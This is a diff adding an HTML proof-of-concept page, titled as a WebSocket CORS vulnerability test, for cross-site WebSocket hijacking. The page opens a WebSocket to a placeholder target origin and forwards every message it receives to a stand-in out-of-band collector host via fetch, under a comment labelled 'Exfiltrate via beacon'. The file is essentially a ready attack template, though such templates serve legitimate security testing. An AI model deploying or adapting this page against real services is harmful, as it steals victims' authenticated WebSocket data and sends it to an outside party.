@@ -1,0 +1,28 @@
+<html>
+  <body>
+    <h3>WebSocket CORS Vulnerability Test</h3>
+    <script>
+      // Replace with the target WebSocket server URL
+      const TARGET_WS = 'wss://TARGET_ORIGIN/chat';
+
+      try {
+        const ws = new WebSocket(TARGET_WS);
+        ws.onopen = (e) => {
+          console.log('WS open', e);
+          // Optional: send a benign message to trigger server behavior
+          try { ws.send('READY'); } catch (e) {}
+        };
+        ws.onmessage = (e) => {
+          console.log('WS message', e.data);
+          // Exfiltrate via beacon
+          fetch('https://YOUR-OAST/log', {method:'POST', mode:'no-cors', body:e.data});
+        };
+        ws.onerror = (e) => console.log('WS error', e);
+        ws.onclose = (e) => console.log('WS close', e.code, e.reason);
+      } catch (err) {
+        console.log('WS exception', err);
+      }
+    </script>
+  </body>
+</html>
+
